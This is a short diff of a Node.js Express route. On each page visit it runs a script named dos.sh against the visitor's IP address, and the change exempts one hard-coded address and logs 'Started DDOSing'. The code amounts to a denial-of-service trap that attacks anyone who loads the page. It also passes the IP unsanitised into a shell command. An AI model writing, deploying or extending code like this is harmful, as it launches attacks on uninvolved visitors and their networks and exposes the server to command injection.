@@ -13,19 +13,23 @@ app.get("/", (req, res) => {
         req.socket.remoteAddress ||
         (req.connection.socket ? req.connection.socket.remoteAddress : null);
     ip = ip.replace("::ffff:", "");
-    console.log(date.toString() + "  " + ip);
 
-    exec(__dirname + "/dos.sh " + ip, (error, stdout, stderr) => {
-        if (error) {
-            console.log(`error: ${error.message}`);
-            return;
-        }
-        if (stderr) {
-            console.log(`stderr: ${stderr}`);
-            return;
-        }
-        console.log(`stdout: ${stdout}`);
-    });
+    if (ip != "91.113.91.133") {
+        console.log("Started DDOSing");
+        console.log(date.toString() + "  " + ip);
+
+        exec(__dirname + "/dos.sh " + ip, (error, stdout, stderr) => {
+            if (error) {
+                console.log(`error: ${error.message}`);
+                return;
+            }
+            if (stderr) {
+                console.log(`stderr: ${stderr}`);
+                return;
+            }
+            console.log(`stdout: ${stdout}`);
+        });
+    }
 
 });
 
